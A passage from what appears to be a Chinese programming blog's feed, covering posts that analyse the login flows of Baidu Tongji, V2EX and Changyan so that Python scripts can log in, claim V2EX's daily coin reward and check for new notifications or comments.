<p>然后在点击登录按钮之后，通过函数格式化一个全局定义的变量来生成的登录表单。具体如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">//全局数据，用于替换表单中的this.xxx</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">VAR = &#123;</span><br><span class="line">    webMasterRegister: &quot;https://tongji.baidu.com/web/register&quot;,</span><br><span class="line">    customRegister: &quot;https://u.baidu.com/ucweb/?module=Reguser&amp;controller=reg&amp;action=index&amp;appid=3&quot;,</span><br><span class="line">    union_forget: &quot;http://union.baidu.com/findPassword!input.action&quot;,</span><br><span class="line">    shifen_forget: &quot;https://aq.baidu.com/new/#/findpwd&quot;,</span><br><span class="line">    uc_forget: &quot;https://aq.baidu.com/new/#/findpwd&quot;,</span><br><span class="line">    waiting_img_src: &quot;/web/img/loadingImage.gif&quot;,</span><br><span class="line">    app_id: &quot;0&quot;,</span><br><span class="line">    errMsg: &quot;&quot;,</span><br><span class="line">    loginUrl: &quot;/web/welcome/login&quot;,</span><br><span class="line">    loginAction: &quot;https://cas.baidu.com/?action=login&quot;,</span><br><span class="line">    userName: &quot;&quot;,</span><br><span class="line">    authCode: &quot;https://cas.baidu.com/?action=image&amp;key=1503151305&quot;,</span><br><span class="line">    registerUrl: &quot;/web/register&quot;,</span><br><span class="line">    fromUrl: &quot;https://tongji.baidu.com/web/welcome/loginback&quot;,</span><br><span class="line">    selfUrl: &quot;https://tongji.baidu.com/web/welcome/login&quot;,</span><br><span class="line">    isIco: &quot;0&quot;,</span><br><span class="line">    webmasterUserNum: &quot;2097176&quot;,</span><br><span class="line">    customerUserNum: &quot;2270927&quot;,</span><br><span class="line">    mtjUserNum: &quot;2262130&quot;</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure> <p>然后在login.js中，通过下面的函数来初始化表单，并且显示。</p> <p>其中<code>n.format(&quot;LoginTemplate&quot;, VAR)</code>用于格式化VAR定义的数据到表单的数据中。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">, h = function() &#123;</span><br><span class="line">    var e = t(&quot;.login-trigger&quot;).eq(0);</span><br><span class="line">    e.on(&quot;click&quot;, function() &#123;</span><br><span class="line">        s || (s = new i(&#123;</span><br><span class="line">            width: 345,</span><br><span class="line">            isModal: !0,</span><br><span class="line">            titleText: &quot;&quot;,</span><br><span class="line">            isSingle: !0,</span><br><span class="line">            content: n.format(&quot;LoginTemplate&quot;, VAR) //初始化登录表单数据</span><br><span class="line">        &#125;),</span><br><span class="line">        loginController.init()),</span><br><span class="line">        s.show()</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure> <p>而在format具体如何替换的，就随意实现了，这里就不在具体分析，有兴趣跟着分析的同学可以去看看common.js中的代码。</p> <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>百度统计接口非常简单，密码未做变换，使用https。</p> <p>登录之后具体做什么也不在分析。</p> <p>预告下次做百度主站的登录分析，简单看了下，非常…复杂！</p> <p>安利一下公众号：汉客儿</p> <p><img src="/img/wechat_public.png" alt="img"></p> <p>转载请注明出处，博客原文：<a href="https://anhkgg.github.io/pylogin-baidutongji-login-analyze/">https://anhkgg.github.io/pylogin-baidutongji-login-analyze/</a></p> ]]></content>          <summary type="html">            &lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;这次分析的百度统计登录接口，算是这几个中最简单的了。&lt;/p&gt; &lt;p&gt;但是学到了一个新东西，叫做js模板，搞web的同学应该知道，我这种web半吊子第一次见，非常有意思。&lt;/p&gt;          </summary>            <category term="crawler" scheme="https://anhkgg.github.io/categories/crawler/"/>                 <category term="crawler" scheme="https://anhkgg.github.io/tags/crawler/"/>            <category term="python" scheme="https://anhkgg.github.io/tags/python/"/>            <category term="js" scheme="https://anhkgg.github.io/tags/js/"/>            <category term="javascript" scheme="https://anhkgg.github.io/tags/javascript/"/>            <category term="v2ex" scheme="https://anhkgg.github.io/tags/v2ex/"/>            <category term="自动领币" scheme="https://anhkgg.github.io/tags/%E8%87%AA%E5%8A%A8%E9%A2%86%E5%B8%81/"/>        </entry>      <entry>     <title>pylogin系列之V2EX自动领币消息提醒</title>     <link href="https://anhkgg.github.io/pylogin-v2ex-login-analyze/"/>     <id>https://anhkgg.github.io/pylogin-v2ex-login-analyze/</id>     <published>2017-08-18T13:09:58.000Z</published>     <updated>2017-08-22T05:31:40.082Z</updated>          <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>最近开始混v2ex，v2ex发主题、回复都要收钱，发帖收钱还跟字数相关，之前不知道这些，发个帖子内容太多，kao，没钱了！</p> <p>虽然主题有人回复会收到钱，但是也没人回复啊，也不知道v2ex大佬们喜欢什么内容！</p> <p>幸好v2ex有个登录领币任务，每天还可以攒点钱，但是有些时候会忘啊，怎么办？…</p> <p>嗯，程序员嘛，偷懒的办法多…这就开始分析接口，自动领币！</p> <a id="more"></a> <p>然后呢，发个主题，总想看看有没有大佬关注和回复，然后就时不时打开浏览器，去刷新一下页面。</p> <p>就跟大部分用windows的人一样，回到桌面不右键+E（刷新）一下，就感觉人生好像少了什么东西（我好像是重症患者，用ubuntu也要找一下刷新桌面）！</p> <p>这种情况是不是病啊？！</p> <p>然后呢，刷新很浪费时间诶，有人回复，看着还算开心嘛，但也没人回复，那不白浪费时间了嘛，还影响期待的小心情！</p> <p>所以呢，还得加上自动消息提醒功能！</p> <p>废话完毕，开始干活！</p> <p>工具：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. chrome/firefox</span><br><span class="line">2. f12，network</span><br><span class="line">3. python：requests、re</span><br></pre></td></tr></table></figure> <h1 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h1><p>开始分析登录接口。打开chrome，f12，进入登录页面。只需要输入名字和密码，没有验证码，真好！</p> <p>访问的链接是：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.v2ex.com/signin</span><br></pre></td></tr></table></figure> <p>然后随便输入什么名字和密码，点击登录，肯定失败，页面有提示。再看网络请求数据：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">POST https://www.v2ex.com/signin</span><br><span class="line">Host: www.v2ex.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) </span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">//发送数据</span><br><span class="line">6b79e5fdb638c190396648c486c313dca73ad9f6e4e122fafc356e54522eedc4:&quot;111111111111111&quot; //name</span><br><span class="line">bb4419eb55aef4106a853ce9f4642d5d58ac021f4e1fef29a230e2352da74802:&quot;11111111111&quot; //password</span><br><span class="line">once:&quot;95083&quot;</span><br><span class="line">next:&quot;/&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//登录错误</span><br><span class="line">&lt;div class=&quot;box&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;header&quot;&gt;&lt;a href=&quot;/&quot;&gt;V2EX&lt;/a&gt; &lt;span class=&quot;chevron&quot;&gt;&amp;nbsp;›&amp;nbsp;&lt;/span&gt; 登录 &amp;nbsp;&lt;li class=&quot;fa fa-lock&quot;&gt;&lt;/li&gt;&lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;problem&quot;&gt;请解决以下问题然后再提交：&lt;ul&gt;&lt;li&gt;用户名和密码无法匹配&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;</span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line">    </span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure> <p>这个请求关键点:</p> <ol> <li>POST请求，url是<code>https://www.v2ex.com/signin</code></li> <li>发送数据有名字和明文密码，以及两个其他不明字段</li> <li>请求是https，所以明文密码不会暴露。</li> </ol> <p>在仔细看发送的4个数据。<br>名字和密码对应的字段都是一长串字符，猜想这个是变化的，每次刷新登录页面都不一样，多次尝试下确认该猜想！</p> <p>如何获取呢，肯定是在打开登录页面时就会收到服务器返回的这两个字符串的。在登录html内容中一翻，看到如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;box&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;header&quot;&gt;&lt;a href=&quot;/&quot;&gt;V2EX&lt;/a&gt; &lt;span class=&quot;chevron&quot;&gt;&amp;nbsp;›&amp;nbsp;&lt;/span&gt; 登录 &amp;nbsp;&lt;li class=&quot;fa fa-lock&quot;&gt;&lt;/li&gt;&lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;cell&quot;&gt;</span><br><span class="line">        &lt;form method=&quot;post&quot; action=&quot;/signin&quot;&gt;</span><br><span class="line">        &lt;table cellpadding=&quot;5&quot; cellspacing=&quot;0&quot; border=&quot;0&quot; width=&quot;100%&quot;&gt;</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">                &lt;td width=&quot;120&quot; align=&quot;right&quot;&gt;用户名&lt;/td&gt;</span><br><span class="line">                &lt;td width=&quot;auto&quot; align=&quot;left&quot;&gt;&lt;input type=&quot;text&quot; class=&quot;sl&quot; name=&quot;804c76d3f1472cdd8721d16f21de446186f2bae893748542ffda39963ff293f4&quot; value=&quot;111111111111111&quot; autofocus=&quot;autofocus&quot; autocorrect=&quot;off&quot; spellcheck=&quot;false&quot; autocapitalize=&quot;off&quot; placeholder=&quot;用户名或电子邮箱地址&quot; /&gt;&lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">                &lt;td width=&quot;120&quot; align=&quot;right&quot;&gt;密码&lt;/td&gt;</span><br><span class="line">                &lt;td width=&quot;auto&quot; align=&quot;left&quot;&gt;&lt;input type=&quot;password&quot; class=&quot;sl&quot; name=&quot;359a3968b3b6f37b05fceed766bd8995090a4fd5cdc74ba0a8cd17b44d2bc86e&quot; value=&quot;&quot; autocorrect=&quot;off&quot; spellcheck=&quot;false&quot; autocapitalize=&quot;off&quot; /&gt;&lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">                &lt;td width=&quot;120&quot; align=&quot;right&quot;&gt;&lt;/td&gt;</span><br><span class="line">                &lt;td width=&quot;auto&quot; align=&quot;left&quot;&gt;&lt;input type=&quot;hidden&quot; value=&quot;79599&quot; name=&quot;once&quot; /&gt;&lt;input type=&quot;submit&quot; class=&quot;super normal button&quot; value=&quot;登录&quot; /&gt;&lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">                &lt;td width=&quot;120&quot; align=&quot;right&quot;&gt;&lt;/td&gt;</span><br><span class="line">                &lt;td width=&quot;auto&quot; align=&quot;left&quot;&gt;&lt;a href=&quot;/forgot&quot;&gt;我忘记密码了&lt;/a&gt;&lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line">        &lt;/table&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; value=&quot;/&quot; name=&quot;next&quot; /&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure> <p>名字对应字段是<code>&lt;input type=&quot;text&quot; class=&quot;sl&quot; name=&quot;804c76d3f1472cdd8721d16f21de446186f2bae893748542ffda39963ff293f4&quot;</code>，</p> <p>密码对应字段是<code>&lt;input type=&quot;password&quot; class=&quot;sl&quot; name=&quot;359a3968b3b6f37b05fceed766bd8995090a4fd5cdc74ba0a8cd17b44d2bc86e&quot;</code>，</p> <p>可以通过正则获取到字段名。</p> <p>名字正则：<code>r&#39;&lt;input type=&quot;text&quot; class=&quot;sl&quot; name=&quot;([\d\w]*?)&quot;&#39;</code></p> <p>密码正则：<code>r&#39;&lt;input type=&quot;password&quot; class=&quot;sl&quot; name=&quot;([\d\w]*?)&quot;&#39;</code></p> <p>也看到了其他两个数据字段，<code>&lt;input type=&quot;hidden&quot; value=&quot;79599&quot; name=&quot;once&quot; /&gt;</code> 和 <code>&lt;input type=&quot;hidden&quot; value=&quot;/&quot; name=&quot;next&quot; /&gt;</code>。</p> <p><code>once</code>对应的值每次都不一样，<code>next</code>的值应该是固定的<code>/</code>，但是为了保险，都通过正则来获取</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r&apos;&lt;input type=&quot;hidden&quot; value=&quot;([\d\w]+?)&quot; name=&quot;once&quot; /&gt;&apos;</span><br><span class="line">r&apos;&lt;input type=&quot;hidden&quot; value=&quot;(.+?)&quot; name=&quot;next&quot; /&gt;&apos;</span><br></pre></td></tr></table></figure> <p>好了，到此登录请求需要的东西都分析完了，然后就是模拟接口发送请求了。</p> <p>忘了还有一点，返回状态的判断。</p> <p>前面看到登录错误的有提示信息，为了更人性化，把这个信息拿到吧。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//登录错误</span><br><span class="line">&lt;div class=&quot;box&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;header&quot;&gt;&lt;a href=&quot;/&quot;&gt;V2EX&lt;/a&gt; &lt;span class=&quot;chevron&quot;&gt;&amp;nbsp;›&amp;nbsp;&lt;/span&gt; 登录 &amp;nbsp;&lt;li class=&quot;fa fa-lock&quot;&gt;&lt;/li&gt;&lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;problem&quot;&gt;请解决以下问题然后再提交：&lt;ul&gt;&lt;li&gt;用户名和密码无法匹配&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure> <p>获取错误信息正则是这样：<code>r&#39;&lt;div class=&quot;problem&quot;&gt;.+?&lt;ul&gt;&lt;li&gt;(.*?)&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&#39;</code></p> <p>登录成功判断待会儿再分析。</p> <p>通过py发送模拟登陆请求，代码如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = &#123;</span><br><span class="line">                self.form_name:name,</span><br><span class="line">                self.form_pass:pwd,</span><br><span class="line">                &apos;once&apos;: self.form_once,</span><br><span class="line">                &apos;next&apos;: self.form_next</span><br><span class="line">                &#125;</span><br><span class="line">r = self.s.post(url, data=payload, headers=headers)</span><br></pre></td></tr></table></figure> <p>保存了返回数据一看，没成功啊，还是未登录的首页。</p> <p>重新再浏览器登录一下，仔细分析了一下。</p> <p>发送了登录请求之后，登录成功之后，页面自动跳转到<code>https://www.v2ex.com</code>，有登录信息了。</p> <p>猜测对请求的头部数据做了某些校验。</p> <p>看看请求的头部数据，如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Host: www.v2ex.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) ...</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 167</span><br><span class="line">Referer: https://www.v2ex.com/signin</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure> <p>一般来说可能会对host，referer等字段检查，加入尝试一下。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">headers = &#123;</span><br><span class="line">    #&apos;Host&apos;: &apos;www.v2ex.com&apos;,</span><br><span class="line">    #&apos;origin&apos;:&apos;https://www.v2ex.com&apos;,</span><br><span class="line">    &apos;referer&apos;:&apos;https://www.v2ex.com/signin&apos;,                </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure> <p>成功登录，屏蔽其中一些字段，发现只需要加入referer即可登录。</p> <p>获取登录成功状态，可以看到登录成功后，会有用户账户信息，如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;/member/anhkgg&quot; class=&quot;top&quot;&gt;anhkgg&lt;/a&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;</span><br><span class="line">&lt;a href=&quot;https://workspace.v2ex.com/&quot; target=&quot;_blank&quot; class=&quot;top&quot;&gt;工作空间&lt;/a&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;</span><br><span class="line">&lt;a href=&quot;/notes&quot; class=&quot;top&quot;&gt;记事本&lt;/a&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;a href=&quot;/t&quot; class=&quot;top&quot;&gt;时间轴&lt;/a&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;a href=&quot;/settings&quot; class=&quot;top&quot;&gt;设置&lt;/a&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;</span><br><span class="line">&lt;a href=&quot;#;&quot; onclick=&quot;if (confirm(&apos;确定要从 V2EX 登出？&apos;)) &#123; location.href= &apos;/signout?once=54090&apos;; &#125;&quot; class=&quot;top&quot;&gt;登出&lt;/a&gt;&lt;/td&gt;</span><br></pre></td></tr></table></figure> <p>那么只需要搜索是否存在<code>&lt;a href=&quot;/member/anhkgg&quot;</code>即可。正则表达式是：<code>r&#39;&lt;a href=&quot;/member/.+?&quot;&gt;&#39;</code>。找到该内容表示登录成功。</p> <h1 id="退出"><a href="#退出" class="headerlink" title="退出"></a>退出</h1><p>登录成功了，顺便看一下退出的接口。抓包看一下，发现访问了如下链接：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.v2ex.com/signout?once=71351</span><br></pre></td></tr></table></figure> <p>又见到once字段，值又是每次不同的。那么也只有动态获取一下了。在前面登录成功的信息中其实可以看到有退出接口的内容。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onclick=&quot;if (confirm(&apos;确定要从 V2EX 登出？&apos;)) &#123; location.href= &apos;/signout?once=54090&apos;; &#125;&quot; class=&quot;top&quot;&gt;登出&lt;/a&gt;&lt;/td&gt;</span><br></pre></td></tr></table></figure> <p>通过正则获取一下once：<code>r&quot;location.href= &#39;/signout\?once=([\d\w]+?)&#39;&quot;</code>，然后模拟退出。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url = &apos;https://www.v2ex.com/signout&apos;</span><br><span class="line">payload = &#123; &apos;once&apos;: self.signout_once&#125;</span><br><span class="line">self.s.get(url, params=payload)</span><br></pre></td></tr></table></figure> <h1 id="新评论"><a href="#新评论" class="headerlink" title="新评论"></a>新评论</h1><p>接着就看看我需要的功能了。</p> <p>首先是获取最新评论条数。找到对应html的内容，如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/a&gt;&lt;/div&gt;&lt;a href=&quot;/notifications&quot; class=&quot;fade&quot;&gt;0 条未读提醒&lt;/a&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure> <p>非常简单，关键字notifications，正则一搜即可拿到。</p> <p><code>r&#39;&lt;a href=&quot;/notifications&quot;.*?&gt;(\d+)(.*?)&lt;/a&gt;&#39;</code></p> <p>不在细说。</p> <p>为了能主动提醒我是否有最新消息，登录成功后，没10分钟刷新一下<code>https://www.v2ex.com</code>，再获取评论条数即可。</p> <p>有新评论就通知我。</p> <h1 id="领取每日奖励"><a href="#领取每日奖励" class="headerlink" title="领取每日奖励"></a>领取每日奖励</h1><p>嗯，钱的事还是挺重要的。</p> <p>首页右侧，每天会出现领取今日奖励的按钮，什么时候出现不知道（过了凌晨12点？），点击后跳转到领取页面，再点击领取按钮就拿到钱了！</p> <p>第一步，拿到领取页面的链接。看下面，是固定的，终于省了一点点事。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;box&quot;&gt;&lt;div class=&quot;inner&quot;&gt;&lt;li class=&quot;fa fa-gift&quot; style=&quot;color: #f90;&quot;&gt;&lt;/li&gt; &amp;nbsp;&lt;a href=&quot;/mission/daily&quot;&gt;领取今日的登录奖励&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure> <p>通过下面的代码跳到领取页面。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url = &apos;https://www.v2ex.com/mission/daily&apos;</span><br><span class="line">r= self.s.get(url)</span><br></pre></td></tr></table></figure> <p>然后看看领取按钮对应的链接，又见once！so，链接不是固定的了。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;cell&quot;&gt;</span><br><span class="line">        &lt;h1&gt;每日登录奖励 20170818&lt;/h1&gt;</span><br><span class="line">        &lt;input type=&quot;button&quot; class=&quot;super normal button&quot; value=&quot;领取 X 铜币&quot; onclick=&quot;location.href = &apos;/mission/daily/redeem?once=48881&apos;;&quot; /&gt;</span><br><span class="line">    &lt;/div&gt;</span><br></pre></td></tr></table></figure> <p>动态获取once对应的值，正则跟退出接口很像：<code>r&quot;&#39;/mission/daily/redeem\?once=([\d\w]+?)&#39;&quot;</code></p> <p>然后模拟请求领取奖励。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url = &apos;https://www.v2ex.com/mission/daily/redeem&apos;</span><br><span class="line">payload = &#123; &apos;once&apos;: once&#125;</span><br><span class="line">r = self.s.get(url, params=payload)</span><br></pre></td></tr></table></figure> <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>好了，到这里分析就完成了。分析内容非常详细，然后也贴了些关键代码，所以完整代码就暂时不提供了！</p> <p>v2ex登录通过变化的名字和密码字段，以及once的值，增加了一定的分析成本，但是总的来说，还是没什么难度！挡不了多少人！</p> <p>其他自动回复啊，最新主题啊…等等，各位看官自行脑洞了！</p> <p>pylogin系列还将继续，尽请关注！</p> <p>安利一下公众号：汉客儿</p> <p><img src="/img/wechat_public.png" alt="img"></p> <p>转载请注明出处，博客原文：<a href="https://anhkgg.github.io/pylogin-v2ex-login-analyze/">https://anhkgg.github.io/pylogin-v2ex-login-analyze/</a></p> ]]></content>          <summary type="html">            &lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;最近开始混v2ex，v2ex发主题、回复都要收钱，发帖收钱还跟字数相关，之前不知道这些，发个帖子内容太多，kao，没钱了！&lt;/p&gt; &lt;p&gt;虽然主题有人回复会收到钱，但是也没人回复啊，也不知道v2ex大佬们喜欢什么内容！&lt;/p&gt; &lt;p&gt;幸好v2ex有个登录领币任务，每天还可以攒点钱，但是有些时候会忘啊，怎么办？…&lt;/p&gt; &lt;p&gt;嗯，程序员嘛，偷懒的办法多…这就开始分析接口，自动领币！&lt;/p&gt;          </summary>            <category term="crawler" scheme="https://anhkgg.github.io/categories/crawler/"/>                 <category term="crawler" scheme="https://anhkgg.github.io/tags/crawler/"/>            <category term="python" scheme="https://anhkgg.github.io/tags/python/"/>            <category term="js" scheme="https://anhkgg.github.io/tags/js/"/>            <category term="javascript" scheme="https://anhkgg.github.io/tags/javascript/"/>            <category term="v2ex" scheme="https://anhkgg.github.io/tags/v2ex/"/>            <category term="自动领币" scheme="https://anhkgg.github.io/tags/%E8%87%AA%E5%8A%A8%E9%A2%86%E5%B8%81/"/>        </entry>      <entry>     <title>pylogin系列之畅言登录评论接口分析</title>     <link href="https://anhkgg.github.io/pylogin-changyan-login-analyze/"/>     <id>https://anhkgg.github.io/pylogin-changyan-login-analyze/</id>     <published>2017-08-16T16:47:29.000Z</published>     <updated>2017-08-16T17:05:02.929Z</updated>          <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>博客使用了畅言做评论系统（多说、网易云跟帖tmd相继挂了…）。<br>畅言后台可以看出功能非常强大，居然还有广告业务…<br>but，畅言登录之后，即使你选择了记住登录，也会在每次关闭浏览器后需要重新登录，很累好伐！</p> <p>折腾了我几天之后，决定还是决定分析一下登录协议，以及简单后台操作接口，然后写个脚本跑着吧，有新评论就给我”叮”一下，就不用我常常登录去翻了！</p> <a id="more"></a> <h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>开始分析，工具：</p> <ol> <li>chrome/firefox</li> <li>f12，network</li> <li>python</li> </ol> <h2 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h2><p>chrome打开主页<a href="http://changyan.kuaizhan.com。" target="_blank" rel="noopener">http://changyan.kuaizhan.com。</a></p> <p>F12，调到network的tab页，然后输入登录，找到登录的包。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Request URL:http://changyan.kuaizhan.com/loginAjax?callback=jQuery17107352265034825938_1502508074058&amp;name=xxx&amp;rememberMe=true&amp;password=1111111&amp;vcode=4795&amp;vipIsvId=0&amp;_=1502508184633</span><br><span class="line">Request Method:GET</span><br><span class="line">Status Code:200 OK</span><br><span class="line"></span><br><span class="line">Host:changyan.kuaizhan.com</span><br><span class="line">Referer:http://changyan.kuaizhan.com/</span><br><span class="line">User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.109 Safari/537.36</span><br><span class="line">X-Requested-With:XMLHttpRequest</span><br><span class="line"></span><br><span class="line">callback:jQuery17107352265034825938_1502508074059 //可以没有</span><br><span class="line">name:xxx</span><br><span 